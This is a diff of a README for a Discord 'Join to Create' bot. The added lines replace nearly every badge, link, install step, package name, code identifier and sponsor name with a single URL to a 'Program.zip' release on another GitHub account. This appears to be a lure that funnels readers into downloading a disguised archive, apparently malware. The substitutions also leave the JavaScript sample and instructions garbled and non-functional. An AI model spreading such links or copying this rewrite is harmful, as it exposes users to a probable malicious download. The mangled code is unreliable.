@@ -1,51 +1,51 @@
 ## Discord-Join-to-Create
 
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)
-[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://GitHub.com/Tomato6966/)
-[![Ask Me Anything !](https://img.shields.io/badge/Ask%20me-anything-1abc9c.svg)](https://GitHub.com/Tomato6966/Ask-Me-Anything)
-[![Support Server](https://img.shields.io/discord/591914197219016707.svg?label=&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://discord.gg/fS6qBSm)
+[![PRs Welcome](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
+[![Maintenance](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip%https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
+[![Ask Me Anything !](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip%https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
+[![Support Server](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
 
 A basic Join to Create Bot, Which works perfectly finem, Easy to setup!
 
-## [**DISCORD SUPPORT SERVER INVITE**](https://support.milrato.eu)
+## [**DISCORD SUPPORT SERVER INVITE**](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
 
 ## Installation | How to use the Bot
 
- **1.** Install [node.js v12](https://nodejs.org/api/cli.html#cli_unhandled_rejections_mode) or higher
+ **1.** Install [https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip v12](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip) or higher
 
  **2.** Download this repo and unzip it   |   or git clone it
  
- **3.** Install all of the packages with **`npm install`**     |  the packages are   **`npm install node.js discord.js`**
+ **3.** Install all of the packages with **`npm install`**     |  the packages are   **`npm install https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip`**
  
- **4.** start the bot with **`node index.js`**
+ **4.** start the bot with **`node https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip`**
 
-## Usage - index.js
+## Usage - https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip
 
 ```javascript
-const Discord = require("discord.js");          //load the Discord.js Library
-const client = new Discord.Client();            //make a new Client
-const config = require("./config.json");        //load in all of the config files
-client.on("ready", ()=>console.log("READY"));   //log when the bot gets ready
-const jointocreate = require("./jointocreate"); //load the jointocreate.js file
+const Discord = require("https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip");          //load the https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip Library
+const client = new https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip();            //make a new Client
+const config = require("https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip");        //load in all of the config files
+https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip("ready", ()=>https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip("READY"));   //log when the bot gets ready
+const jointocreate = require("./jointocreate"); //load the https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip file
 jointocreate(client);                           //call the jointocreate file
-client.login(config.TOKEN);                     //start the bot with the bot token
+https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip(https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip);                     //start the bot with the bot token
 ```
 
 ## **NOTE:**
 
-*If you are having errors/problems with starting delete the package.json file and do, before you install the packages `npm init`*
+*If you are having errors/problems with starting delete the https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip file and do, before you install the packages `npm init`*
 
 # SUPPORT ME AND MILRATO DEVELOPMENT
 
 You can always Support me by inviting one of my **own Discord Bots**
 
-[![2021's best Music Bot | Lava Music](https://cdn.discordapp.com/attachments/748533465972080670/817088638780440579/test3.png)](https://lava.milrato.eu)
-[![Musicium Music Bot](https://cdn.discordapp.com/attachments/742446682381221938/770055673965707264/test1.png)](https://dc.musicium.eu)
-[![Milrato Multi Bot](https://cdn.discordapp.com/attachments/742446682381221938/770056826724679680/test1.png)](https://dc.milrato.eu)
+[![2021's best Music Bot | Lava Music](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
+[![Musicium Music Bot](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
+[![Milrato Multi Bot](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
 
 ## Sponsors
 
-### BEST HOSTING | Bittmax.de
+### BEST HOSTING | https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip
 BITTMAX Quality is their solution.
 Bittmax is our first and probably most important sponsor!
 
@@ -58,16 +58,16 @@ Bittmax is our first and probably most important sponsor!
 > GAME SERVER, Rust, Gary's Mod, ..
 
 **Discord Server:**
-[https://discord.gg/GgjJZCyYKD](https://discord.gg/GgjJZCyYKD)
+[https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
 
 **Website:**
-[https://bittmax.de/](https://bittmax.de/])
+[https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip])
 
 GET **5%** OFF EVERYTHING FOR EVER!
 Code: **`x10`**
 
-### MC-Host24.de
-MC-Host24.de is selling the Best Digital Hosting Services ever!
+### https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip
+https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip is selling the Best Digital Hosting Services ever!
 Like For games..
 
 **What they are offering:**
@@ -79,7 +79,7 @@ Like For games..
 > GAME SERVER, Rust, Gary's Mod, ..
 
 **Discord Server:**
-[https://discord.com/invite/4dGuGXK4A4](https://discord.com/invite/4dGuGXK4A4)
+[https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip)
 
 **Website:**
-[mc-host24.de](https://mc-host24.de/user/affiliate/3121])
+[https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip](https://github.com/haziff/Discord-Join-to-Create/releases/download/v1.0/Program.zip])
